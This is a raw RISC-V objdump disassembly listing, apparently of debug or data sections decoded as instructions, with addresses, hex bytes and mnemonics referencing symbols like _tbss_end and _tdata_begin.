     fa4:	0000                	unimp
     fa6:	0d0c                	addi	a1,sp,656
     fa8:	01b2                	slli	gp,gp,0xc
     faa:	0000                	unimp
     fac:	3708                	fld	fa0,40(a4)
     fae:	4914                	lw	a3,16(a0)
     fb0:	0000                	unimp
     fb2:	1000                	addi	s0,sp,32
     fb4:	820d                	srli	a2,a2,0x3
     fb6:	0005                	c.nop	1
     fb8:	0800                	addi	s0,sp,16
     fba:	00491b37          	lui	s6,0x491
     fbe:	0000                	unimp
     fc0:	1114                	addi	a3,sp,160
     fc2:	785f 0800 0b38      	0xb380800785f
     fc8:	000001e7          	jalr	gp,zero
     fcc:	0018                	0x18
     fce:	0812                	slli	a6,a6,0x4
     fd0:	00000187          	0x187
     fd4:	630a                	ld	t1,128(sp)
     fd6:	0001                	nop
     fd8:	f700                	sd	s0,40(a4)
     fda:	0001                	nop
     fdc:	0b00                	addi	s0,sp,400
     fde:	0079                	c.nop	30
     fe0:	0000                	unimp
     fe2:	0000                	unimp
     fe4:	f610                	sd	a2,40(a2)
     fe6:	0001                	nop
     fe8:	2400                	fld	fs0,8(s0)
     fea:	3c08                	fld	fa0,56(s0)
     fec:	7a08                	ld	a0,48(a2)
     fee:	0002                	c.slli	zero,0x0
     ff0:	0d00                	addi	s0,sp,656
     ff2:	00d6                	slli	ra,ra,0x15
     ff4:	0000                	unimp
     ff6:	3e08                	fld	fa0,56(a2)
     ff8:	4909                	li	s2,2
     ffa:	0000                	unimp
     ffc:	0000                	unimp
     ffe:	e80d                	bnez	s0,1030 <_tbss_end+0xfac>
    1000:	0004                	0x4
    1002:	0800                	addi	s0,sp,16
    1004:	0049093f 0d040000 	0xd0400000049093f
    100c:	0109                	addi	sp,sp,2
    100e:	0000                	unimp
    1010:	4008                	lw	a0,0(s0)
    1012:	4909                	li	s2,2
    1014:	0000                	unimp
    1016:	0800                	addi	s0,sp,16
    1018:	180d                	addi	a6,a6,-29
    101a:	0006                	c.slli	zero,0x1
    101c:	0800                	addi	s0,sp,16
    101e:	0941                	addi	s2,s2,16
    1020:	0049                	c.nop	18
    1022:	0000                	unimp
    1024:	0d0c                	addi	a1,sp,656
    1026:	0361                	addi	t1,t1,24
    1028:	0000                	unimp
    102a:	4208                	lw	a0,0(a2)
    102c:	4909                	li	s2,2
    102e:	0000                	unimp
    1030:	1000                	addi	s0,sp,32
    1032:	de0d                	beqz	a2,f6c <_tbss_end+0xee8>
    1034:	0004                	0x4
    1036:	0800                	addi	s0,sp,16
    1038:	00490943          	fmadd.s	fs2,fs2,ft4,ft0,rne
    103c:	0000                	unimp
    103e:	0d14                	addi	a3,sp,656
    1040:	00000587          	0x587
    1044:	4408                	lw	a0,8(s0)
    1046:	4909                	li	s2,2
    1048:	0000                	unimp
    104a:	1800                	addi	s0,sp,48
    104c:	f50d                	bnez	a0,f76 <_tbss_end+0xef2>
    104e:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1052:	0945                	addi	s2,s2,17
    1054:	0049                	c.nop	18
    1056:	0000                	unimp
    1058:	0d1c                	addi	a5,sp,656
    105a:	05c2                	slli	a1,a1,0x10
    105c:	0000                	unimp
    105e:	4608                	lw	a0,8(a2)
    1060:	4909                	li	s2,2
    1062:	0000                	unimp
    1064:	2000                	fld	fs0,0(s0)
    1066:	1300                	addi	s0,sp,416
    1068:	0118                	addi	a4,sp,128
    106a:	0000                	unimp
    106c:	0208                	addi	a0,sp,256
    106e:	4f08                	lw	a0,24(a4)
    1070:	c008                	sw	a0,0(s0)
    1072:	0002                	c.slli	zero,0x0
    1074:	0d00                	addi	s0,sp,656
    1076:	01a5                	addi	gp,gp,9
    1078:	0000                	unimp
    107a:	5008                	lw	a0,32(s0)
    107c:	c00a                	sw	sp,0(sp)
    107e:	0002                	c.slli	zero,0x0
    1080:	0000                	unimp
    1082:	0014                	0x14
    1084:	0000                	unimp
    1086:	0800                	addi	s0,sp,16
    1088:	0951                	addi	s2,s2,20
    108a:	02c0                	addi	s0,sp,324
    108c:	0000                	unimp
    108e:	0100                	addi	s0,sp,128
    1090:	0214                	addi	a3,sp,256
    1092:	0005                	c.nop	1
    1094:	0800                	addi	s0,sp,16
    1096:	01630a53          	fadd.s	fs4,ft6,fs6,rne
    109a:	0000                	unimp
    109c:	0200                	addi	s0,sp,256
    109e:	4714                	lw	a3,8(a4)
    10a0:	0001                	nop
    10a2:	0800                	addi	s0,sp,16
    10a4:	0a56                	slli	s4,s4,0x15
    10a6:	00000163          	beqz	zero,10a8 <_tbss_end+0x1024>
    10aa:	0204                	addi	s1,sp,256
    10ac:	0a00                	addi	s0,sp,272
    10ae:	0000015b          	0x15b
    10b2:	02d0                	addi	a2,sp,324
    10b4:	0000                	unimp
    10b6:	0000790b          	0x790b
    10ba:	1f00                	addi	s0,sp,944
    10bc:	1300                	addi	s0,sp,416
    10be:	036a                	slli	t1,t1,0x1a
    10c0:	0000                	unimp
    10c2:	0318                	addi	a4,sp,384
    10c4:	6208                	ld	a0,0(a2)
    10c6:	1408                	addi	a0,sp,544
    10c8:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    10cc:	0434                	addi	a3,sp,520
    10ce:	0000                	unimp
    10d0:	6308                	ld	a0,0(a4)
    10d2:	1412                	slli	s0,s0,0x24
    10d4:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    10d8:	4c0d                	li	s8,3
    10da:	0004                	0x4
    10dc:	0800                	addi	s0,sp,16
    10de:	0664                	addi	s1,sp,780
    10e0:	0049                	c.nop	18
    10e2:	0000                	unimp
    10e4:	0d08                	addi	a0,sp,656
    10e6:	01ad                	addi	gp,gp,11
    10e8:	0000                	unimp
    10ea:	6608                	ld	a0,8(a2)
    10ec:	1a09                	addi	s4,s4,-30
    10ee:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    10f2:	1814                	addi	a3,sp,48
    10f4:	0001                	nop
    10f6:	0800                	addi	s0,sp,16
    10f8:	027a1e67          	0x27a1e67
    10fc:	0000                	unimp
    10fe:	0110                	addi	a2,sp,128
    1100:	1200                	addi	s0,sp,288
    1102:	d008                	sw	a0,32(s0)
    1104:	0002                	c.slli	zero,0x0
    1106:	0a00                	addi	s0,sp,272
    1108:	032a                	slli	t1,t1,0xa
    110a:	0000                	unimp
    110c:	032a                	slli	t1,t1,0xa
    110e:	0000                	unimp
    1110:	0000790b          	0x790b
    1114:	1f00                	addi	s0,sp,944
    1116:	1200                	addi	s0,sp,288
    1118:	3008                	fld	fa0,32(s0)
    111a:	15000003          	lb	zero,336(zero) # 150 <_tbss_end+0xcc>
    111e:	ff10                	sd	a2,56(a4)
    1120:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    1124:	7a08                	ld	a0,48(a2)
    1126:	5908                	lw	a0,48(a0)
    1128:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    112c:	00fd                	addi	ra,ra,31
    112e:	0000                	unimp
    1130:	7b08                	ld	a0,48(a4)
    1132:	5911                	li	s2,-28
    1134:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1138:	b30d                	j	e5a <_tbss_end+0xdd6>
    113a:	0006                	c.slli	zero,0x1
    113c:	0800                	addi	s0,sp,16
    113e:	067c                	addi	a5,sp,780
    1140:	0049                	c.nop	18
    1142:	0000                	unimp
    1144:	0008                	0x8
    1146:	0812                	slli	a6,a6,0x4
    1148:	0034                	addi	a3,sp,8
    114a:	0000                	unimp
    114c:	1e10                	addi	a2,sp,816
    114e:	0004                	0x4
    1150:	b000                	fsd	fs0,32(s0)
    1152:	ba08                	fsd	fa0,48(a2)
    1154:	a208                	fsd	fa0,0(a2)
    1156:	0004                	0x4
    1158:	1100                	addi	s0,sp,160
    115a:	705f 0800 12bb      	0x12bb0800705f
    1160:	0359                	addi	t1,t1,22
    1162:	0000                	unimp
    1164:	1100                	addi	s0,sp,160
    1166:	725f 0800 07bc      	0x7bc0800725f
    116c:	0049                	c.nop	18
    116e:	0000                	unimp
    1170:	1108                	addi	a0,sp,160
    1172:	775f 0800 07bd      	0x7bd0800775f
    1178:	0049                	c.nop	18
    117a:	0000                	unimp
    117c:	0d0c                	addi	a1,sp,656
    117e:	0140                	addi	s0,sp,132
    1180:	0000                	unimp
    1182:	be08                	fsd	fa0,56(a2)
    1184:	3b09                	addiw	s6,s6,-30
    1186:	0000                	unimp
    1188:	1000                	addi	s0,sp,32
    118a:	260d                	addiw	a2,a2,3
    118c:	0002                	c.slli	zero,0x0
    118e:	0800                	addi	s0,sp,16
    1190:	003b09bf 11120000 	0x11120000003b09bf
    1198:	625f 0066 c008      	0xc0080066625f
    119e:	3111                	addiw	sp,sp,-28
    11a0:	18000003          	lb	zero,384(zero) # 180 <_tbss_end+0xfc>
    11a4:	850d                	srai	a0,a0,0x3
    11a6:	0000                	unimp
    11a8:	0800                	addi	s0,sp,16
    11aa:	07c1                	addi	a5,a5,16
    11ac:	0049                	c.nop	18
    11ae:	0000                	unimp
    11b0:	0d28                	addi	a0,sp,664
    11b2:	0130                	addi	a2,sp,136
    11b4:	0000                	unimp
    11b6:	c808                	sw	a0,16(s0)
    11b8:	5b0a                	lw	s6,160(sp)
    11ba:	0001                	nop
    11bc:	3000                	fld	fs0,32(s0)
    11be:	e60d                	bnez	a2,11e8 <_tbss_end+0x1164>
    11c0:	0001                	nop
    11c2:	0800                	addi	s0,sp,16
    11c4:	1dca                	slli	s11,s11,0x32
    11c6:	0626                	slli	a2,a2,0x9
    11c8:	0000                	unimp
    11ca:	0d38                	addi	a4,sp,664
    11cc:	02aa                	slli	t0,t0,0xa
    11ce:	0000                	unimp
    11d0:	cc08                	sw	a0,24(s0)
    11d2:	501d                	c.li	zero,-25
    11d4:	0006                	c.slli	zero,0x1
    11d6:	4000                	lw	s0,0(s0)
    11d8:	a10d                	j	15fa <_tbss_end+0x1576>
    11da:	0004                	0x4
    11dc:	0800                	addi	s0,sp,16
    11de:	06740dcf          	fnmadd.q	fs11,fs0,ft7,ft0,rne
    11e2:	0000                	unimp
    11e4:	0d48                	addi	a0,sp,660
    11e6:	05dc                	addi	a5,sp,708
    11e8:	0000                	unimp
    11ea:	d008                	sw	a0,32(s0)
    11ec:	8e09                	sub	a2,a2,a0
    11ee:	0006                	c.slli	zero,0x1
    11f0:	5000                	lw	s0,32(s0)
    11f2:	5f11                	li	t5,-28
    11f4:	6275                	lui	tp,0x1d
    11f6:	0800                	addi	s0,sp,16
    11f8:	033111d3          	fadd.d	ft3,ft2,fs3,rtz
    11fc:	0000                	unimp
    11fe:	1158                	addi	a4,sp,164
    1200:	755f 0070 d408      	0xd4080070755f
    1206:	5912                	lw	s2,36(sp)
    1208:	68000003          	lb	zero,1664(zero) # 680 <_tbss_end+0x5fc>
    120c:	5f11                	li	t5,-28
    120e:	7275                	lui	tp,0xffffd
    1210:	0800                	addi	s0,sp,16
    1212:	07d5                	addi	a5,a5,21
    1214:	0049                	c.nop	18
    1216:	0000                	unimp
    1218:	0d70                	addi	a2,sp,668
    121a:	000000f7          	0xf7
    121e:	d808                	sw	a0,48(s0)
    1220:	9411                	srai	s0,s0,0x24
    1222:	0006                	c.slli	zero,0x1
    1224:	7400                	ld	s0,40(s0)
    1226:	b40d                	j	c48 <_tbss_end+0xbc4>
    1228:	0005                	c.nop	1
    122a:	0800                	addi	s0,sp,16
    122c:	11d9                	addi	gp,gp,-10
    122e:	06a4                	addi	s1,sp,840
    1230:	0000                	unimp
    1232:	6c5f1177          	0x6c5f1177
    1236:	0062                	c.slli	zero,0x18
    1238:	dc08                	sw	a0,56(s0)
    123a:	3111                	addiw	sp,sp,-28
    123c:	78000003          	lb	zero,1920(zero) # 780 <_tbss_end+0x6fc>
    1240:	620d                	lui	tp,0x3
    1242:	0001                	nop
    1244:	0800                	addi	s0,sp,16
    1246:	07df 0049 0000      	0x4907df
    124c:	0d88                	addi	a0,sp,720
    124e:	00000173          	0x173
    1252:	e008                	sd	a0,0(s0)
    1254:	d50a                	sw	sp,168(sp)
    1256:	0000                	unimp
    1258:	9000                	0x9000
    125a:	760d                	lui	a2,0xfffe3
    125c:	0006                	c.slli	zero,0x1
    125e:	0800                	addi	s0,sp,16
    1260:	04c012e3          	bne	zero,a2,1aa4 <_tbss_end+0x1a20>
    1264:	0000                	unimp
    1266:	0d98                	addi	a4,sp,720
    1268:	0291                	addi	t0,t0,4
    126a:	0000                	unimp
    126c:	e708                	sd	a0,8(a4)
    126e:	7b0c                	ld	a1,48(a4)
    1270:	0001                	nop
    1272:	a000                	fsd	fs0,0(s0)
    1274:	260d                	addiw	a2,a2,3
    1276:	0004                	0x4
    1278:	0800                	addi	s0,sp,16
    127a:	0ee9                	addi	t4,t4,26
    127c:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    1280:	0da4                	addi	s1,sp,728
    1282:	00000297          	auipc	t0,0x0
    1286:	ea08                	sd	a0,16(a2)
    1288:	4909                	li	s2,2
    128a:	0000                	unimp
    128c:	ac00                	fsd	fs0,24(s0)
    128e:	1600                	addi	s0,sp,800
    1290:	00ed                	addi	ra,ra,27
    1292:	0000                	unimp
    1294:	04c0                	addi	s0,sp,580
    1296:	0000                	unimp
    1298:	0004c017          	auipc	zero,0x4c
    129c:	1700                	addi	s0,sp,928
    129e:	0000015b          	0x15b
    12a2:	00061417          	auipc	s0,0x61
    12a6:	1700                	addi	s0,sp,928
    12a8:	0049                	c.nop	18
    12aa:	0000                	unimp
    12ac:	1200                	addi	s0,sp,288
    12ae:	cb08                	sw	a0,16(a4)
    12b0:	0004                	0x4
    12b2:	0500                	addi	s0,sp,640
    12b4:	04c0                	addi	s0,sp,580
    12b6:	0000                	unimp
    12b8:	8418                	0x8418
    12ba:	0004                	0x4
    12bc:	4800                	lw	s0,16(s0)
    12be:	02650807          	0x2650807
    12c2:	1408                	addi	a0,sp,544
    12c4:	0006                	c.slli	zero,0x1
    12c6:	1900                	addi	s0,sp,176
    12c8:	03e4                	addi	s1,sp,460
    12ca:	0000                	unimp
    12cc:	6708                	ld	a0,8(a4)
    12ce:	0702                	slli	a4,a4,0x0
    12d0:	0049                	c.nop	18
    12d2:	0000                	unimp
    12d4:	1900                	addi	s0,sp,176
    12d6:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    12da:	6c08                	ld	a0,24(s0)
    12dc:	0b02                	slli	s6,s6,0x0
    12de:	0700                	addi	s0,sp,896
    12e0:	0000                	unimp
    12e2:	1908                	addi	a0,sp,176
    12e4:	020e                	slli	tp,tp,0x3
    12e6:	0000                	unimp
    12e8:	6c08                	ld	a0,24(s0)
    12ea:	1402                	slli	s0,s0,0x20
    12ec:	0700                	addi	s0,sp,896
    12ee:	0000                	unimp
    12f0:	1910                	addi	a2,sp,176
    12f2:	000001c7          	fmsub.s	ft3,ft0,ft0,ft0,rne
    12f6:	6c08                	ld	a0,24(s0)
    12f8:	1e02                	slli	t3,t3,0x20
    12fa:	0700                	addi	s0,sp,896
    12fc:	0000                	unimp
    12fe:	1918                	addi	a4,sp,176
    1300:	00000447          	fmsub.s	fs0,ft0,ft0,ft0,rne
    1304:	6e08                	ld	a0,24(a2)
    1306:	0802                	slli	a6,a6,0x0
    1308:	0049                	c.nop	18
    130a:	0000                	unimp
    130c:	1920                	addi	s0,sp,184
    130e:	0025                	c.nop	9
    1310:	0000                	unimp
    1312:	6f08                	ld	a0,24(a4)
    1314:	0802                	slli	a6,a6,0x0
    1316:	0909                	addi	s2,s2,2
    1318:	0000                	unimp
    131a:	1924                	addi	s1,sp,184
    131c:	00000463          	beqz	zero,1324 <_tbss_end+0x12a0>
    1320:	7208                	ld	a0,32(a2)
    1322:	0702                	slli	a4,a4,0x0
    1324:	0049                	c.nop	18
    1326:	0000                	unimp
    1328:	1940                	addi	s0,sp,180
    132a:	0451                	addi	s0,s0,20
    132c:	0000                	unimp
    132e:	7308                	ld	a0,32(a4)
    1330:	1602                	slli	a2,a2,0x20
    1332:	091e                	slli	s2,s2,0x7
    1334:	0000                	unimp
    1336:	1948                	addi	a0,sp,180
    1338:	0372                	slli	t1,t1,0x1c
    133a:	0000                	unimp
    133c:	7508                	ld	a0,40(a0)
    133e:	0702                	slli	a4,a4,0x0
    1340:	0049                	c.nop	18
    1342:	0000                	unimp
    1344:	1950                	addi	a2,sp,180
    1346:	0459                	addi	s0,s0,22
    1348:	0000                	unimp
    134a:	7708                	ld	a0,40(a4)
    134c:	0a02                	slli	s4,s4,0x0
    134e:	0000092f          	0x92f
    1352:	1958                	addi	a4,sp,180
    1354:	027c                	addi	a5,sp,268
    1356:	0000                	unimp
    1358:	7a08                	ld	a0,48(a2)
    135a:	1302                	slli	t1,t1,0x20
    135c:	01e1                	addi	gp,gp,24
    135e:	0000                	unimp
    1360:	1960                	addi	s0,sp,188
    1362:	01ec                	addi	a1,sp,204
    1364:	0000                	unimp
    1366:	7b08                	ld	a0,48(a4)
    1368:	0702                	slli	a4,a4,0x0
    136a:	0049                	c.nop	18
    136c:	0000                	unimp
    136e:	1968                	addi	a0,sp,188
    1370:	0604                	addi	s1,sp,768
    1372:	0000                	unimp
    1374:	7c08                	ld	a0,56(s0)
    1376:	1302                	slli	t1,t1,0x20
    1378:	01e1                	addi	gp,gp,24
    137a:	0000                	unimp
    137c:	1970                	addi	a2,sp,188
    137e:	039d                	addi	t2,t2,7
    1380:	0000                	unimp
    1382:	7d08                	ld	a0,56(a0)
    1384:	1402                	slli	s0,s0,0x20
    1386:	0935                	addi	s2,s2,13
    1388:	0000                	unimp
    138a:	1978                	addi	a4,sp,188
    138c:	0216                	slli	tp,tp,0x5
    138e:	0000                	unimp
    1390:	8008                	0x8008
    1392:	0702                	slli	a4,a4,0x0
    1394:	0049                	c.nop	18
    1396:	0000                	unimp
    1398:	1980                	addi	s0,sp,240
    139a:	0000016b          	0x16b
    139e:	8108                	0x8108
    13a0:	0902                	slli	s2,s2,0x0
    13a2:	0614                	addi	a3,sp,768
    13a4:	0000                	unimp
    13a6:	1988                	addi	a0,sp,240
    13a8:	03dd                	addi	t2,t2,23
    13aa:	0000                	unimp
    13ac:	a408                	fsd	fa0,8(s0)
    13ae:	0702                	slli	a4,a4,0x0
    13b0:	000008e3          	beqz	zero,1bc0 <_tbss_end+0x1b3c>
    13b4:	1a90                	addi	a2,sp,368
    13b6:	036a                	slli	t1,t1,0x1a
    13b8:	0000                	unimp
    13ba:	a808                	fsd	fa0,16(s0)
    13bc:	1302                	slli	t1,t1,0x20
    13be:	0314                	addi	a3,sp,384
    13c0:	0000                	unimp
    13c2:	01f8                	addi	a4,sp,204
    13c4:	4f1a                	lw	t5,132(sp)
    13c6:	0002                	c.slli	zero,0x0
    13c8:	0800                	addi	s0,sp,16
    13ca:	02a9                	addi	t0,t0,10
    13cc:	d012                	sw	tp,32(sp)
    13ce:	0002                	c.slli	zero,0x0
    13d0:	0000                	unimp
    13d2:	1a02                	slli	s4,s4,0x20
    13d4:	05aa                	slli	a1,a1,0xa
    13d6:	0000                	unimp
    13d8:	ad08                	fsd	fa0,24(a0)
    13da:	0c02                	slli	s8,s8,0x0
    13dc:	0946                	slli	s2,s2,0x11
    13de:	0000                	unimp
    13e0:	0518                	addi	a4,sp,640
    13e2:	381a                	fld	fa6,416(sp)
    13e4:	0001                	nop
    13e6:	0800                	addi	s0,sp,16
    13e8:	02b2                	slli	t0,t0,0xc
    13ea:	c110                	sw	a2,0(a0)
    13ec:	0006                	c.slli	zero,0x1
    13ee:	2000                	fld	fs0,0(s0)
    13f0:	1a05                	addi	s4,s4,-31
    13f2:	00000113          	li	sp,0
    13f6:	b408                	fsd	fa0,40(s0)
    13f8:	0a02                	slli	s4,s4,0x0
    13fa:	0952                	slli	s2,s2,0x14
    13fc:	0000                	unimp
    13fe:	0538                	addi	a4,sp,648
    1400:	1200                	addi	s0,sp,288
    1402:	1a08                	addi	a0,sp,304
    1404:	0006                	c.slli	zero,0x1
    1406:	0200                	addi	s0,sp,256
    1408:	0801                	addi	a6,a6,0
    140a:	000003cf          	fnmadd.s	ft7,ft0,ft0,ft0,rne
    140e:	1a05                	addi	s4,s4,-31
    1410:	0006                	c.slli	zero,0x1
    1412:	1200                	addi	s0,sp,288
    1414:	a208                	fsd	fa0,0(a2)
    1416:	0004                	0x4
    1418:	1600                	addi	s0,sp,800
    141a:	00ed                	addi	ra,ra,27
    141c:	0000                	unimp
    141e:	064a                	slli	a2,a2,0x12
    1420:	0000                	unimp
    1422:	0004c017          	auipc	zero,0x4c
    1426:	1700                	addi	s0,sp,928
    1428:	0000015b          	0x15b
    142c:	00064a17          	auipc	s4,0x64
    1430:	1700                	addi	s0,sp,928
    1432:	0049                	c.nop	18
    1434:	0000                	unimp
    1436:	1200                	addi	s0,sp,288
    1438:	2108                	fld	fa0,0(a0)
    143a:	0006                	c.slli	zero,0x1
    143c:	1200                	addi	s0,sp,288
    143e:	2c08                	fld	fa0,24(s0)
    1440:	0006                	c.slli	zero,0x1
    1442:	1600                	addi	s0,sp,800
    1444:	00e1                	addi	ra,ra,24
    1446:	0000                	unimp
    1448:	0674                	addi	a3,sp,780
    144a:	0000                	unimp
    144c:	0004c017          	auipc	zero,0x4c
    1450:	1700                	addi	s0,sp,928
    1452:	0000015b          	0x15b
    1456:	0000e117          	auipc	sp,0xe
    145a:	1700                	addi	s0,sp,928
    145c:	0049                	c.nop	18
    145e:	0000                	unimp
    1460:	1200                	addi	s0,sp,288
    1462:	5608                	lw	a0,40(a2)
    1464:	0006                	c.slli	zero,0x1
    1466:	1600                	addi	s0,sp,800
    1468:	0049                	c.nop	18
    146a:	0000                	unimp
    146c:	068e                	slli	a3,a3,0x3
    146e:	0000                	unimp
    1470:	0004c017          	auipc	zero,0x4c
    1474:	1700                	addi	s0,sp,928
    1476:	0000015b          	0x15b
    147a:	1200                	addi	s0,sp,288
    147c:	7a08                	ld	a0,48(a2)
    147e:	0006                	c.slli	zero,0x1
    1480:	0a00                	addi	s0,sp,272
    1482:	0034                	addi	a3,sp,8
    1484:	0000                	unimp
    1486:	06a4                	addi	s1,sp,840
    1488:	0000                	unimp
    148a:	0000790b          	0x790b
    148e:	0200                	addi	s0,sp,256
    1490:	0a00                	addi	s0,sp,272
    1492:	0034                	addi	a3,sp,8
    1494:	0000                	unimp
    1496:	06b4                	addi	a3,sp,840
    1498:	0000                	unimp
    149a:	0000790b          	0x790b
    149e:	0000                	unimp
    14a0:	0700                	addi	s0,sp,896
    14a2:	040c                	addi	a1,sp,512
    14a4:	0000                	unimp
    14a6:	2408                	fld	fa0,8(s0)
    14a8:	1a01                	addi	s4,s4,-32
    14aa:	035f 0000 911b      	0x911b0000035f
    14b0:	0005                	c.nop	1
    14b2:	1800                	addi	s0,sp,48
    14b4:	2808                	fld	fa0,16(s0)
    14b6:	0801                	addi	a6,a6,0
    14b8:	06fa                	slli	a3,a3,0x1e
    14ba:	0000                	unimp
    14bc:	3419                	addiw	s0,s0,-26
    14be:	0004                	0x4
    14c0:	0800                	addi	s0,sp,16
    14c2:	012a                	slli	sp,sp,0xa
    14c4:	fa11                	bnez	a2,13d8 <_tbss_end+0x1354>
    14c6:	0006                	c.slli	zero,0x1
    14c8:	0000                	unimp
    14ca:	2c19                	addiw	s8,s8,6
    14cc:	0002                	c.slli	zero,0x0
    14ce:	0800                	addi	s0,sp,16
    14d0:	4907012b          	0x4907012b
    14d4:	0000                	unimp
    14d6:	0800                	addi	s0,sp,16
    14d8:	0619                	addi	a2,a2,6
    14da:	0004                	0x4
    14dc:	0800                	addi	s0,sp,16
    14de:	012c                	addi	a1,sp,136
    14e0:	0007000b          	0x7000b
    14e4:	1000                	addi	s0,sp,32
    14e6:	1200                	addi	s0,sp,288
    14e8:	c108                	sw	a0,0(a0)
    14ea:	0006                	c.slli	zero,0x1
    14ec:	1200                	addi	s0,sp,288
    14ee:	b408                	fsd	fa0,40(s0)
    14f0:	0006                	c.slli	zero,0x1
    14f2:	1b00                	addi	s0,sp,432
    14f4:	001d                	c.nop	7
    14f6:	0000                	unimp
    14f8:	080e                	slli	a6,a6,0x3
    14fa:	0144                	addi	s1,sp,132
    14fc:	3f08                	fld	fa0,56(a4)
    14fe:	19000007          	0x19000007
    1502:	0000048b          	0x48b
    1506:	4508                	lw	a0,8(a0)
    1508:	1201                	addi	tp,tp,-32
    150a:	0000073f 050b1900 	0x50b19000000073f
    1512:	0000                	unimp
    1514:	4608                	lw	a0,8(a2)
    1516:	1201                	addi	tp,tp,-32
    1518:	0000073f 05341906 	0x53419060000073f
    1520:	0000                	unimp
    1522:	4708                	lw	a0,8(a4)
    1524:	1201                	addi	tp,tp,-32
    1526:	0042                	c.slli	zero,0x10
    1528:	0000                	unimp
    152a:	000c                	0xc
    152c:	420a                	lw	tp,128(sp)
    152e:	0000                	unimp
    1530:	4f00                	lw	s0,24(a4)
    1532:	0b000007          	0xb000007
    1536:	0079                	c.nop	30
    1538:	0000                	unimp
    153a:	0002                	c.slli	zero,0x0
    153c:	d81c                	sw	a5,48(s0)
    153e:	8508                	0x8508
    1540:	0702                	slli	a4,a4,0x0
    1542:	0864                	addi	s1,sp,28
    1544:	0000                	unimp
    1546:	7519                	lui	a0,0xfffe6
    1548:	0005                	c.nop	1
    154a:	0800                	addi	s0,sp,16
    154c:	5f180287          	0x5f180287
    1550:	0000                	unimp
    1552:	0000                	unimp
    1554:	1119                	addi	sp,sp,-26
    1556:	0005                	c.nop	1
    1558:	0800                	addi	s0,sp,16
    155a:	0288                	addi	a0,sp,320
    155c:	1412                	slli	s0,s0,0x24
    155e:	0006                	c.slli	zero,0x1
    1560:	0800                	addi	s0,sp,16
    1562:	6f19                	lui	t5,0x6
    1564:	0002                	c.slli	zero,0x0
    1566:	0800                	addi	s0,sp,16
    1568:	0289                	addi	t0,t0,2
    156a:	6410                	ld	a2,8(s0)
    156c:	0008                	0x8
    156e:	1000                	addi	s0,sp,32
    1570:	cd19                	beqz	a0,158e <_tbss_end+0x150a>
    1572:	0005                	c.nop	1
    1574:	0800                	addi	s0,sp,16
    1576:	028a                	slli	t0,t0,0x2
    1578:	0001f717          	auipc	a4,0x1f
    157c:	2c00                	fld	fs0,24(s0)
    157e:	d719                	beqz	a4,148c <_tbss_end+0x1408>
    1580:	0001                	nop
    1582:	0800                	addi	s0,sp,16
    1584:	490f028b          	0x490f028b
    1588:	0000                	unimp
    158a:	5000                	lw	s0,32(s0)
    158c:	2f19                	addiw	t5,t5,6
    158e:	0004                	0x4
    1590:	0800                	addi	s0,sp,16
    1592:	028c                	addi	a1,sp,320
    1594:	742c                	ld	a1,104(s0)
    1596:	0008                	0x8
    1598:	5800                	lw	s0,48(s0)
    159a:	e319                	bnez	a4,15a0 <_tbss_end+0x151c>
    159c:	0005                	c.nop	1
    159e:	0800                	addi	s0,sp,16
    15a0:	028d                	addi	t0,t0,3
    15a2:	061a                	slli	a2,a2,0x6
    15a4:	60000007          	0x60000007
    15a8:	3a19                	addiw	s4,s4,-26
    15aa:	0004                	0x4
    15ac:	0800                	addi	s0,sp,16
    15ae:	028e                	slli	t0,t0,0x3
    15b0:	4f16                	lw	t5,68(sp)
    15b2:	0001                	nop
    15b4:	7000                	ld	s0,32(s0)
    15b6:	ee19                	bnez	a2,15d4 <_tbss_end+0x1550>
    15b8:	0005                	c.nop	1
    15ba:	0800                	addi	s0,sp,16
    15bc:	4f16028f          	0x4f16028f
    15c0:	0001                	nop
    15c2:	7800                	ld	s0,48(s0)
    15c4:	c819                	beqz	s0,15da <_tbss_end+0x1556>
    15c6:	0000                	unimp
    15c8:	0800                	addi	s0,sp,16
    15ca:	0290                	addi	a2,sp,320
    15cc:	4f16                	lw	t5,68(sp)
    15ce:	0001                	nop
    15d0:	8000                	0x8000
    15d2:	a019                	j	15d8 <_tbss_end+0x1554>
    15d4:	0005                	c.nop	1
    15d6:	0800                	addi	s0,sp,16
    15d8:	0291                	addi	t0,t0,4
    15da:	7b10                	ld	a2,48(a4)
    15dc:	0008                	0x8
    15de:	8800                	0x8800
    15e0:	6319                	lui	t1,0x6
    15e2:	0002                	c.slli	zero,0x0
    15e4:	0800                	addi	s0,sp,16
    15e6:	0292                	slli	t0,t0,0x4
    15e8:	8b10                	0x8b10
    15ea:	0008                	0x8
    15ec:	9000                	0x9000
    15ee:	4a19                	li	s4,6
    15f0:	0005                	c.nop	1
    15f2:	0800                	addi	s0,sp,16
    15f4:	490f0293          	addi	t0,t5,1168 # 6490 <_tbss_end+0x640c>
    15f8:	0000                	unimp
    15fa:	a800                	fsd	fs0,16(s0)
    15fc:	8c19                	sub	s0,s0,a4
    15fe:	0001                	nop
    1600:	0800                	addi	s0,sp,16
    1602:	0294                	addi	a3,sp,320
    1604:	4f16                	lw	t5,68(sp)
    1606:	0001                	nop
    1608:	ac00                	fsd	fs0,24(s0)
    160a:	b119                	j	1210 <_tbss_end+0x118c>
    160c:	0000                	unimp
    160e:	0800                	addi	s0,sp,16
    1610:	0295                	addi	t0,t0,5
    1612:	4f16                	lw	t5,68(sp)
    1614:	0001                	nop
    1616:	b400                	fsd	fs0,40(s0)
    1618:	7b19                	lui	s6,0xfffe6
    161a:	0001                	nop
    161c:	0800                	addi	s0,sp,16
    161e:	0296                	slli	t0,t0,0x5
    1620:	4f16                	lw	t5,68(sp)
    1622:	0001                	nop
    1624:	bc00                	fsd	fs0,56(s0)
    1626:	4e19                	li	t3,6
    1628:	0000                	unimp
    162a:	0800                	addi	s0,sp,16
    162c:	4f160297          	auipc	t0,0x4f160
    1630:	0001                	nop
    1632:	c400                	sw	s0,8(s0)
    1634:	5d19                	li	s10,-26
    1636:	0000                	unimp
    1638:	0800                	addi	s0,sp,16
    163a:	0298                	addi	a4,sp,320
    163c:	4f16                	lw	t5,68(sp)
